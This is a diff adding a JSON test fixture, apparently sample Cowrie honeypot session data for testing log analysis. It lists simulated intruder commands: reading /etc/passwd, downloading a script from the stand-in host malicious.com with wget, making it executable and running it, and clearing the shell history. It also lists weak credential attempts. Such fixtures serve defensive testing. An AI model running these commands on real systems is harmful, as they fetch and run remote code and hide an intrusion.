@@ -1,0 +1,21 @@
+{
+  "session_id": "test_session_001",
+  "srcip": "203.0.113.100",
+  "commands": [
+    "whoami",
+    "uname -a",
+    "cat /etc/passwd",
+    "wget http://malicious.com/payload.sh",
+    "chmod +x payload.sh",
+    "./payload.sh",
+    "history -c"
+  ],
+  "auth_attempts": [
+    {"username": "root", "password": "toor", "success": false},
+    {"username": "admin", "password": "admin123", "success": true}
+  ],
+  "files": ["/etc/passwd", "payload.sh"],
+  "network_events": ["cowrie.session.connect", "cowrie.session.file_download"],
+  "start_time": "2024-03-10T20:00:00.000000",
+  "last_time": "2024-03-10T20:12:00.000000"
+}
